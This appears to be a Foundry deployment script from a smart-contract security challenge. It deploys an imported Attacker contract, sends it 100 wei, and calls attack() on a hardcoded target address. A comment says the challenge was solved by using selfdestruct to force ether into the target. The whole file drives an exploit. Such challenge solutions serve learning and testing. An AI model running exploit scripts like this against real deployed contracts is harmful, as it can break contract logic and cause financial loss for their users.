// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    Attacker attacker;

    function setUp() public {
     
    }


 //solveed by using the selfdestruct() to send ether to another contract
  function run() public {
        vm.startBroadcast();
        attacker = new Attacker();
        
        //send ether to attacker

        (bool success, )  = address(attacker).call{value: 100 wei}("");
        require(success == true, 'send ether failed');

        address targetContract = 0x12A88C4d98551F89604b98127Bc1224aEB66e1EC;

        attacker.attack(targetContract);
        vm.stopBroadcast();
    }
}
